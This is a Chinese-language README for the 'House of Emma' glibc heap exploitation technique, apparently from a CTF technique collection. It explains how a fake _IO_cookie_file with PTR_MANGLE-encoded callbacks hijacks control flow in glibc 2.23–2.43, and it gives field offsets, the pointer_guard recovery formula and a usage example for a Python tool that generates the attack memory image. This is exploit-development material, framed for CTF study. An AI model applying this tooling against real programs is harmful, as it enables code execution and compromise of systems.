# House of Emma

## 结论

- 适用范围：**IO cookie 的最终触发点覆盖 2.23～2.43；原始的 largebin 投递方式只到 2.41**。
- 原语/效果：让一个合法 vtable 落在 `_IO_cookie_jumps` 上，借 cookie 回调间接完成调用。
- 版本变化：2.23 的回调是明文；2.24 的 `983fd5c` 给 cookie 回调加上了 PTR_MANGLE，同期合法的 `_IO_cookie_jumps` 也能通过 vtable validation；2.42 起原来的 largebin 投递方式失效，但 cookie 的最终触发点在 2.43 仍然存在。

<!-- PRIMITIVE_REQUIREMENTS:START -->
## 原语要求与版本边界

| 项目 | 本手法要求 |
|---|---|
| 最小输入原语 / 信息 | 控制 cookie FILE/回调表并投递/触发；2.24+需 pointer_guard |
| 关键环境与不变量 | 合法 `_IO_cookie_jumps`；回调参数与 mangle 正确 |
| 最终输出原语 | cookie read/write/seek/close 间接调用 |
| 版本边界应如何理解 | 2.24 PTR_MANGLE 只是新增信息/编码前置；2.42 只切断经典 largebin 投递，cookie 最终触发点到 2.43 仍在。 |
<!-- PRIMITIVE_REQUIREMENTS:END -->

## 从源码看

关键代码在 `libio/iofopncook.c` 和 x86-64 的 `pointer_guard.h` 里。2.23 直接从
`cfile->__io_functions.write` 调用；进入 2.24 后，
[`983fd5c`](https://sourceware.org/git/?p=glibc.git;a=commit;h=983fd5c41ab7e5a5c33922259ca1ac99b3b413f8)
让保存时做 `PTR_MANGLE`、消费时做 `PTR_DEMANGLE`。这一步加密和
[`db3476a`](https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51)
引入的 primary vtable 白名单是两个互相独立的检查，不能笼统地写成“2.23 到最新版本都需要 guard”。

源码里仍能走到最终触发点，不代表旧的利用链依然成立：投递方式、私有结构和控制流终点都要按附件 libc/ld 的 Build ID 重新核实。

源码与背景：

- [glibc 2.43 `libio/iofopncook.c`](https://sourceware.org/cgit/glibc/tree/libio/iofopncook.c?h=release/2.43/master)
- [glibc 2.43 x86-64 `pointer_guard.h`](https://sourceware.org/cgit/glibc/tree/sysdeps/unix/sysv/linux/x86_64/pointer_guard.h?h=release/2.43/master)
- [glibc 2.43 `libio/vtables.c`](https://sourceware.org/cgit/glibc/tree/libio/vtables.c?h=release/2.43/master)
- [GNU glibc 当前开发分支](https://github.com/bminor/glibc/tree/master)
- [House of all 综述](https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/)
- [高版本 heap exploitation](https://roderickchan.github.io/zh-cn/2023-03-01-analysis-of-glibc-heap-exploitation-in-high-version/)

## PoC

- [`poc_cookie_callback_2.23.c`](./poc_cookie_callback_2.23.c)：在真实 fopencookie 对象上覆盖明文的 write 回调。
- [`poc_cookie_callback_2.24_2.43.c`](./poc_cookie_callback_2.24_2.43.c)：从已知回调的密文反推出 pointer_guard，再重新编码出攻击用的回调；已在 2.24/2.31/2.43 上实际跑通。

fake `_IO_cookie_file` 的字段偏移、四个回调槽的位置，以及 `rol64(pointer ^ guard, 17)` 的编码关系都写在了这份较新的 C PoC 末尾。

## Python 离线板子

[`emma.py`](./emma.py) 提供 `build_house_of_emma`、`encode_cookie_callback` 和 `recover_pointer_guard`。

### 函数用途

生成 `_IO_cookie_file` 的 cookie 与四个回调槽，按版本处理明文或 PTR_MANGLE 编码。

### 对应 PoC

- [`poc_cookie_callback_2.23.c`](./poc_cookie_callback_2.23.c)：2.23 明文回调；
- [`poc_cookie_callback_2.24_2.43.c`](./poc_cookie_callback_2.24_2.43.c)：2.24+ 从已知明文/密文恢复 pointer_guard 后编码攻击回调。

### 编码公式

```c
encoded = rol64(callback ^ pointer_guard, 17)
pointer_guard = ror64(encoded, 17) ^ known_callback
```

### `_IO_cookie_file` 关键偏移

```text
FILE + 0xe0  cookie
FILE + 0xe8  read callback
FILE + 0xf0  write callback
FILE + 0xf8  seek callback
FILE + 0x100 close callback
```

### 参数

| 参数 | 含义 |
|---|---|
| `version` | 目标 glibc 版本，支持 `2.23`～`2.43`。 |
| `file_addr` | fake `_IO_cookie_file` 起点。 |
| `cookie_addr` | 写入 `FILE+0xe0` 的 cookie 参数。 |
| `callback_addr` | 要消费的 write callback 明文地址；函数按版本编码。 |
| `pointer_guard` | 2.24+ 的 pointer guard；未知时函数拒绝生成密文。 |
| `read_addr` / `seek_addr` / `close_addr` | 其余三个 cookie callback 槽，默认 0，按题目实际触发路径补充。 |

### 返回对象

返回一个 `MemoryWrite`。`MemoryWrite` 每个成员含义：

| 成员 | 含义 |
|---|---|
| `address` | 要写入的绝对地址。 |
| `data` | 要写入的小端字节串（`bytes`）。 |
| `label` | 该写入的用途标签，用于调试和识别。 |

本次返回内容：

```text
address: file_addr
data:    0x108 字节 cookie FILE 镜像
label:   "cookie FILE (<version>)"
```

镜像关键字段：

```text
+0xe0  cookie = cookie_addr
+0xe8  read callback（明文或编码）
+0xf0  write callback（明文或编码）
+0xf8  seek callback（明文或编码）
+0x100 close callback（明文或编码）
```

### 辅助函数

```python
encode_cookie_callback(callback_addr, pointer_guard, mangled=bool) -> int
recover_pointer_guard(known_callback_addr, encoded_callback) -> int
```

`recover_pointer_guard` 用于 CTF 中“已知函数指针 + UAF 读密文”的场景：从真实 `fopencookie` 对象的槽位读出编码后的 benign 回调，反推 pointer_guard。

### 最小使用示例

```python
from emma import build_house_of_emma, encode_cookie_callback, recover_pointer_guard

# 场景一：已知明文 callback 和泄露的密文，恢复 pointer_guard
known_cb = 0x7fff1234          # 例如 benign_write
encoded = 0xdeadbeefcafebabe   # 从 cookie FILE +0xf0 读出的密文
guard = recover_pointer_guard(known_cb, encoded)

# 场景二：生成攻击用 cookie FILE 镜像
writes = build_house_of_emma(
    version="2.35",
    file_addr=0x100000,         # fake _IO_cookie_file
    cookie_addr=0x200000,       # cookie 参数
    callback_addr=0x401234,     # write callback（明文）
    pointer_guard=guard,        # 2.24+ 必填
)

w = writes[0]
print(w.label, hex(w.address), w.data.hex())
# +0xe8 read / +0xf0 write / +0xf8 seek / +0x100 close
```

### 调用者必须提供

```text
libc 基址
2.24+ 的 pointer_guard，或能通过已知明文/密文恢复它
能投递 fake _IO_cookie_file 或覆盖现有 cookie FILE 的原语
能触发 cookie read/write/seek/close 的入口
```

### 函数不负责

```text
不把 fake FILE 挂到 _IO_list_all
不负责 cookie FILE 的 flags/缓冲区条件
不触发 fwrite/fclose 等消费点
不负责 2.23 与 2.24+ 之间的格式差异之外的其他投递
```

## 迁移与调试

1. 先确认投递路径和最终触发点在目标 Build ID 上都真实存在。
2. 把占位地址和 add/edit/free 的顺序换成题目实际给出的能力。
3. 在消费函数处下断点，逐字段核对 size、对齐、safe-linking，以及 FILE/link_map 的私有布局。
